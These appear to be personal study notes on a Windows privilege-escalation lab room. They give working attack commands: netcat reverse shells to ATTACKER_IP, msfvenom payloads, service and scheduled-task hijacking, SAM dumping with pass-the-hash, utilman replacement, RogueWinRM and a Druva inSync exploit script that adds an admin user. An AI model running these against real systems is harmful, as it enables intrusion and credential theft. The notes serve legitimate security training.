## Windows Privilege Escalation

In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:

|   |   |
|---|---|
|**SYSTEM / LocalSystem**|An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.|
|**Local Service**|Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.|
|**Network Service**|Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.|

These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.
## Harvesting Passwords from Usual Spots

installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml
### Powershell History

```shell-session
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Note:** The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`.

### Saved Windows Credentials

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. List saved credentials:

```shell-session
cmdkey /list
```

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.

```shell-session
runas /savecred /user:admin cmd.exe
# change user: as per requirement
```

### IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

```shell-session
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

Short answer:  
**IIS** (Internet Information Services) is Microsoft’s web server software — it’s used to host websites and web apps on Windows. It’s **not automatically running on every laptop**; it’s an optional Windows feature you can install (common on servers and developer machines).

What IIS is used for (simple)

- Host websites and web applications (HTML, ASP.NET, PHP, etc.).
    
- Serve web pages when someone visits `http://` or `https://` on that machine.
    
- Run backend code and connect to databases for websites.
    

Is IIS on every laptop?

- **No.** On Windows Server, IIS is commonly installed and enabled.
    
- On Windows desktop (Windows 10/11), IIS is **optional**. Developers or admins might install it, but most consumer laptops don’t have it running by default.
    
- You can _enable_ it via “Turn Windows features on or off” → Internet Information Services, or install it for development.

### Retrieve Credentials from Software: PuTTY

PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

**Note:** Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

- A **proxy** is a server that sits between your computer and the destination (the SSH server).
    
    - Example: your company might require all outbound connections to go through an HTTP or SOCKS proxy.
        
    - PuTTY can be told: “when you connect to this host, first talk to this proxy and authenticate there.”
        
- In PuTTY’s session settings you can configure a proxy type (HTTP, SOCKS4/5, Telnet, etc.), the proxy host/port, and **proxy credentials** (username/password) if the proxy requires them.


## Other Quick Wins

### Scheduled Tasks

Scheduled tasks can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:

```shell-session
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```
- `schtasks` → manages or views scheduled tasks
    
- `/query` → asks for information
    
- `/tn vulntask` → specifies the task name (“vulntask”)
    
- `/fo list` → shows output in list format
    
- `/v` → “verbose” → shows extra details

what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.

If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`:

```shell-session
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

**icacls** isn't a long formal phrase Microsoft spells out in docs — it's the command name that effectively means **`IC` + `ACLs`** — i.e. **Integrity Control / Access Control Lists** tool.

Plain explanation:

- **ACLs** = **Access Control Lists** (who can do what to a file/folder).
    
- **IC** in the name refers to **Integrity Control** features that `icacls` supports (integrity levels like Low/Medium/High).
    
- So `icacls` is the modern Windows utility for viewing and editing **ACLs** (and integrity flags).

Some other common permission codes you may see

- `(F)` — Full control
    
- `(M)` — Modify
    
- `(RX)` — Read & execute
    
- `(R)` — Read-only
    
- `(W)` — Write
    
- `(D)` — Delete

As can be seen in the result, the **BUILTIN\Users** group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. `nc64.exe` can be found on `C:\tools`. Let's change the bat file to spawn a reverse shell:
```shell-session
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```
We then start a listener on the attacker machine on the same port we indicated on our reverse shell:
```shell-session
nc -lvp 4444
```
We can run the task with the following command:
```shell-session
C:\> schtasks /run /tn vulntask
```
And you will receive the reverse shell with taskusr1 privileges as expected

### AlwaysInstallElevated

What is AlwaysInstallElevated? (one line)

It’s a Windows policy that — if enabled in **both** the per-user and the machine registry — makes **MSI installers (.msi)** run with **elevated (admin)** privileges even when run by a normal user.

---

Why that’s dangerous (very short)

If both registry keys are enabled, **any user** can run a malicious `.msi` file and it will execute as SYSTEM/Administrator. That lets an attacker get a high-privilege shell or install backdoors — total compromise.

---

Which registry keys matter

Both of these must exist and be set to `1` for the weakness to be exploitable:

- Per-user key:
    

`HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`

- Machine key:
    

`HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`

**How to check them (what you’d run):**

`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`

If the value `AlwaysInstallElevated` appears and its `REG_DWORD` value is `0x1` (1), it’s enabled for that hive. **Both** MUST be `1` to be exploitable.

---

Example exploitation flow (lab/testing only)

1. Attacker confirms both keys = `1`.
    
2. Attacker creates a malicious MSI that runs a reverse shell:
    

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f msi -o malicious.msi`

3. Attacker transfers `malicious.msi` to victim and runs:
    

`msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`

4. Because AlwaysInstallElevated is enabled, the MSI runs with elevated rights and gives the attacker an elevated shell.
    

> NOTE: This only works if both HKCU and HKLM keys are set to `1`. Many systems do **not** enable this, and you should only test in labs/with permission.

---

How to fix / mitigate (simple)

- **Best fix:** Ensure both registry values are **absent** or set to `0`. Don’t enable them.
    
    `reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f`
    
- Enforce via Group Policy (don’t enable Always install with elevated privileges).
    
- Restrict which users can write to locations that installers might use.
    
- Monitor for unexpected MSI installs and audit installer-related registry settings.


## Abusing Service Misconfigurations

### Windows Services

Windows services are managed by the **Service Control Manager** (SCM).

Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started.
Each service also specifies the user account under which the service will run.

check the apphostsvc service configuration with the `sc qc` command:
```shell-session
C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
```
Here we can see that the associated executable is specified through the **BINARY_PATH_NAME** parameter, and the account used to run the service is shown on the **SERVICE_START_NAME** parameter.

All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`:

![Service registry entries](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/06c05c134e4922ec8ff8d9b56382c58f.png)

A subkey exists for every service in the system. Again, we can see the associated executable on the **ImagePath** value and the account used to start the service on the **ObjectName** value. If a DACL has been configured for the service, it will be stored in a subkey called **Security**. As you have guessed by now, only administrators can modify such registry entries by default.

### Insecure Permissions on Service Executable

If a Windows service’s **executable file** is writable by low-privileged users, an attacker can replace it with a malicious program. When the service runs (or is restarted), Windows will execute the malicious program with the service’s account privileges — giving the attacker those rights.

---
![Pasted image 20251024172510.png](attachments/Pasted%20image%2020251024172510.png)
![Pasted image 20251024172520.png](attachments/Pasted%20image%2020251024172520.png)


What the output shows (plain)

- `sc qc WindowsScheduler` shows the service runs as user `.\svcuser1` and the executable path is `C:\Progra~2\System~1\WService.exe`.
    
- `icacls C:\PROGRA~2\SYSTEM~1\WService.exe` shows `Everyone:(I)(M)` → **Everyone has Modify permission** on the executable.
    
    - `(I)` = inherited; `(M)` = Modify (write/replace allowed).
        
- Because “Everyone” can modify the file, any low-privileged user can overwrite `WService.exe`.

Let's generate an exe-service payload using msfvenom and serve it through a python webserver:

```shell-session
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

user@attackerpc$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

We can then pull the payload from Powershell with the following command:
```shell-session
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:

```shell-session
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```

We start a reverse listener on our attacker machine:
```shell-session
user@attackerpc$ nc -lvp 4445
```

And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart
```shell-session
C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler
```
**Note:** PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges:
```shell-session
user@attackerpc$ nc -lvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr1
```

### Unquoted Service Paths

What is an “unquoted service path”?

When Windows starts a service it runs the executable listed in the service configuration. If that executable path contains spaces **and is not wrapped in quotes**, Windows may mis-interpret the path and try shorter prefixes first.  
Example unsafe value:

`C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`

Because it’s unquoted, Windows might try to run, in order:

1. `C:\MyPrograms\Disk.exe`
    
2. `C:\MyPrograms\Disk Sorter.exe`
    
3. `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` (the intended one)
    

![Pasted image 20251024212221.png](attachments/Pasted%20image%2020251024212221.png)
properly quoted
vs
unquoted
![Pasted image 20251024212242.png](attachments/Pasted%20image%2020251024212242.png)


---

Why that is a problem (short)

If an attacker can place an executable in any of the locations Windows checks _before_ the real program (for example `C:\MyPrograms\Disk.exe`), the service will run that file instead — and the service runs under its configured account. So the attacker gets code execution with the service’s privileges.

---

When can it be exploited?

You need two things:

1. The service path is **unquoted** and contains spaces.
    
2. A directory the service will search (like `C:\MyPrograms`) is **writable** by the attacker (e.g. `Users`/`Everyone` has write/create rights).
    

If both are true, you can drop a malicious `Disk.exe` and restart the service to get code running as the service user.

most of the service executables will be installed under `C:\Program Files` or `C:\Program Files (x86)` by default, which isn't writable by unprivileged users.

![Pasted image 20251026231702.png](attachments/Pasted%20image%2020251026231702.png)
- `NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)` → SYSTEM has Full control (inherited).
    
- `BUILTIN\Administrators:(I)(OI)(CI)(F)` → Admins have Full control.
    
- `BUILTIN\Users:(I)(OI)(CI)(RX)` → Users can Read & eXecute (inherited).
    
- `BUILTIN\Users:(I)(CI)(AD)` → Users can **A**dd **D**irectories (create subfolders).
    
- `BUILTIN\Users:(I)(CI)(WD)` → Users can **W**rite **D**ata (create files).


KaliLinux
```shell-session
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

user@attackerpc$ nc -lvp 4446

python3 -m http.server 8000
wget http://10.48.122.165:8000/rev-svc2.exe -O rev-svc2.exe
```

Move the file to the hijack location and allow execution

Put it where Windows will check (one of the prefix candidates) — example:

`move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe`

Make sure the service can execute it (grant Everyone full for lab):

`icacls C:\MyPrograms\Disk.exe /grant Everyone:F`

Restart the vulnerable service so Windows launches your file

Use `sc` to stop and start the service (use `sc.exe` if in PowerShell):

`sc stop "disk sorter enterprise" sc start "disk sorter enterprise"`

### Insecure Permissions on Service Executable

Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.

Discretionary Access Control Lists are used by Windows systems to specify who can access a given resource. While they are often referenced when talking about files, they also apply to other components as registry keys, services and scheduled tasks.

To check for a service DACL from the command line, you can use [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite. The command to check for the thmservice service DACL is:
![Pasted image 20251026235620.png](attachments/Pasted%20image%2020251026235620.png)
Here we can see that the `BUILTIN\\Users` group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.

Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:

KaliLinux
```shell-session
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

user@attackerpc$ nc -lvp 4447

wget http://10.48.122.165:8000/rev-svc3.exe -O rev-svc3.exe

icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):

Command Prompt
```shell-session
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:

Command Prompt
```shell-session
C:\> sc stop THMService
C:\> sc start THMService
```

And we will receive a shell back in our attacker's machine

```
type filename.txt
```

## Abusing dangerous privileges

### Windows Privileges

DACL - Discretionary Access Control Lists are used by Windows systems to specify who can access a given resource. While they are often referenced when talking about files, they also apply to other components as registry keys, services and scheduled tasks.

Each user has a set of assigned privileges that can be checked with the following command:
```shell-session
whoami /priv
```

A complete list of available privileges on Windows systems is available [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the [Priv2Admin](https://github.com/gtworek/Priv2Admin) Github project.

### SeBackup / SeRestore

The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.

The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.

```
# connect to windows rdp
remina
```

This account is part of the "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the "Open as administrator" option to use these privileges.

Once on the command prompt, we can check our privileges with the following command:

```shell-session
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

To backup the SAM and SYSTEM hashes, we can use the following commands:
```shell-session
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.
```

This will create a share named `public` pointing to the `share` directory, which requires the username and password of our current windows session. After this, we can use the `copy` command in our windows machine to transfer both files to our AttackBox: 

```shell-session
C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

And use impacket to retrieve the users' password hashes:

KaliLinux
```shell-session
user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:

KaliLinux
```shell-session
user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.48.178.183
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### SeTakeOwnership

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys
for example, search for a service running as SYSTEM and take ownership of the service's executable.

To get the SeTakeOwnership privilege, we need to open a command prompt using the "Open as administrator" option. We will be asked to input our password to get an elevated console:

![Run as admin](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/33303d0cde736589d2838ee894379ff2.png)  

Once on the command prompt, we can check our privileges with the following command:

```shell-session
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set  
```

**Why `utilman.exe` is mentioned** (conceptual)  
Windows runs certain accessibility/system helper programs with **very high privileges** (SYSTEM) at the logon/lock screen so people with disabilities can use them before logging in. If an attacker can replace one of those programs with their own code, that code will run with SYSTEM privileges when the helper is launched — granting the attacker the same high privilege level.

We'll abuse `utilman.exe` to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

![utilman normal behaviour](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a5437a609e41d982b320967667e9b97a.png)

Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.

To replace utilman, we will start by taking ownership of it with the following command:
```shell-session
C:\> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
```

Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:

```shell-session
C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files
```

After this, we will replace utilman.exe with a copy of cmd.exe:

```shell-session
C:\Windows\System32\> copy cmd.exe utilman.exe
        1 file(s) copied.
```

To trigger utilman, we will lock our screen from the start button:

![lock screen](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dd7290ca93369cee33182023cb9190ff.png)

And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:

![utilman shell](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1401bc3dcb1e4eb84f526b95567a5ef8.png)

### SeImpersonate / SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

What they do (one-line)

- **SeImpersonate**: lets a process **temporarily act like another user** so it can do things with that user’s permissions for a short time.
    
- **SeAssignPrimaryToken**: lets a process **create a whole new process that runs as another user** (longer-lived than impersonation).
    

Simple analogy

- **Impersonation (SeImpersonate)** = borrowing someone’s library card for a single visit to check out books.
    
- **AssignPrimaryToken** = getting a permanent copy of their library card and opening a new account that looks exactly like theirs.

Why OSes use this

Services (web servers, FTP servers, print servers) often need to do work _as the connecting user_ so the operating system can enforce file and resource permissions. Impersonation lets the service ask Windows: “Can _this_ user read that file?” and let Windows answer based on real user permissions — simpler and safer than reimplementing checks in every service.

Step-by-step, simply (conceptual — **no exploit instructions**)

1. **Compromise a web app first**  
    The attacker already has a web shell on the target web server. That gives them a way to run things on the server (this is the initial foothold).
    
2. **Goal: get SYSTEM to authenticate to the attacker**  
    Certain Windows services (the example uses BITS) will, during startup or when triggered, try to contact Windows management endpoints (WinRM) on the local machine. Those internal attempts are done under the **SYSTEM** account — the most powerful local account.
    
3. **Fake the management endpoint**  
    If the real remote-management service (WinRM) isn’t running, an attacker can create a fake service that appears to be the management endpoint and _listen_ for the local service’s authentication attempt.
    
4. **Impersonation privilege is the enabler**  
    If the attacker’s process or account has the ability to impersonate (SeImpersonate / SeAssignPrimaryToken), it can accept the incoming authentication from the local service and then _use that authenticated identity_ — which is SYSTEM — to run commands as SYSTEM.
    
5. **Establishing a remote shell**  
    The attacker arranges for a program on the server to call back to the attacker’s machine (a “reverse shell”) so the attacker gets interactive access. Because the attacker leveraged SYSTEM’s authentication, the shell appears to the system as running with SYSTEM privileges.
    
6. **Timing/behavior note**  
    Some of these tricks need a little time — services may start/stop or wait on timeouts — so the experiment can take a minute or two to complete.


Let's start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:

`http://MACHINE_IP/`

We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:

![Webshell impersonate privileges](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4603506a36f4bbda602dc67cdc845d9f.png)  

To use RogueWinRM, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the `C:\tools\` folder.

The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.

If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.

Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:


```shell-session
user@attackerpc$ nc -lvp 4442
```

And then, use our web shell to trigger the RogueWinRM exploit using the following command:

```shell-session
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

![RogueWinRM exploit execution](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/24545e313a2e5ddee2386a68b4c7adeb.png)  

**Note:** The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.

The `-p` parameter specifies the executable to be run by the exploit, which is `nc64.exe` in this case. The `-a` parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be `-e cmd.exe ATTACKER_IP 4442`.

If all was correctly set up, you should expect a shell with SYSTEM privileges:
```shell-session
user@attackerpc$ nc -lvp 4442
Listening on 0.0.0.0 4442
Connection received on 10.10.175.90 49755
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
nt authority\system
```

Very short, non-actionable breakdown

- `RogueWinRM.exe` — a program described as an exploit that interacts with Windows management ports.
    
- `-p "C:\tools\nc64.exe"` — tells that program which binary it will try to cause to run on the target (a networking utility in this example).
    
- `-a "-e cmd.exe ATTACKER_IP 4442"` — supplies arguments that the payload binary should receive (here, instructions to create a remote/interactive connection back to an external host).
    

In plain language: the command is trying to get a program started on the Windows box that then connects back to the attacker, giving interactive access

## Abusing vulnerable software

### Unpatched Software

use the `wmic` tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software

```shell-session
wmic product get name,version,vendor
```

### Case Study: Druva inSync 6.6.3

The software is vulnerable because it runs an RPC (Remote Procedure Call) server on port 6064 with SYSTEM privileges, accessible from localhost only. RPC is simply a mechanism that allows a given process to expose functions (called procedures in RPC lingo) over the network so that other machines can call them remotely.

In the case of Druva inSync, one of the procedures exposed (specifically procedure number 5) on port 6064 allowed anyone to request the execution of any command. Since the RPC server runs as SYSTEM, any command gets executed with SYSTEM privileges.

The original vulnerability reported on versions 6.5.0 and prior allowed any command to be run without restrictions. The original idea behind providing such functionality was to remotely execute some specific binaries provided with inSync, rather than any command. Still, no check was made to make sure of that.

A patch was issued, where they decided to check that the executed command started with the string `C:\ProgramData\Druva\inSync4\`, where the allowed binaries were supposed to be. But then, this proved insufficient since you could simply make a path traversal attack to bypass this kind of control. Suppose that you want to execute `C:\Windows\System32\cmd.exe`, which is not in the allowed path; you could simply ask the server to run `C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe` and that would bypass the check successfully.

![Pasted image 20251031192122.png](attachments/Pasted%20image%2020251031192122.png)

original exploit's code:
```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

You can pop a Powershell console and paste the exploit directly to execute it (The exploit is also available in the target machine at `C:\tools\Druva_inSync_exploit.txt`). Note that the exploit's default payload, specified in the `$cmd` variable, will create a user named `pwnd` in the system, but won't assign him administrative privileges, so we will probably want to change the payload for something more useful. For this room, we will change the payload to run the following command:

```powershell
net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
```

This will create user `pwnd` with a password of `SimplePass123` and add it to the administrators' group. If the exploit was successful, you should be able to run the following command to verify that the user `pwnd` exists and is part of the administrators' group:

```shell-session
PS C:\> net user pwnd
User name                    pwnd
Full Name
Account active               Yes
[...]

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
```

As a last step, you can run a command prompt as administrator:
![Run Command Prompt as Pwnd](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bbd0af143c9a9b31c1acce32fabfdc0f.png)  

When prompted for credentials, use the `pwnd` account. From the new command prompt, you can retrieve the Administrator's desktop with the following command `type C:\Users\Administrator\Desktop\flag.txt`.

## Tools of the Trade

### WinPEAS

```shell-session
C:\> winpeas.exe > outputfile.txt
```

WinPEAS can be downloaded [here](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS).

**WinPEAS** — automated Windows enumeration: finds lots of potential privilege-escalation hints (weak perms, services, scheduled tasks, unquoted paths, interesting files, etc.).

### PrivescCheck

**PrivescCheck** — PowerShell version of the same idea: runs checks inside PowerShell (no native EXE needed).

PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.

PrivescCheck can be downloaded [here](https://github.com/itm4n/PrivescCheck).

**Reminder**: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the `Set-ExecutionPolicy` cmdlet as shown below.

Powershell
```shell-session
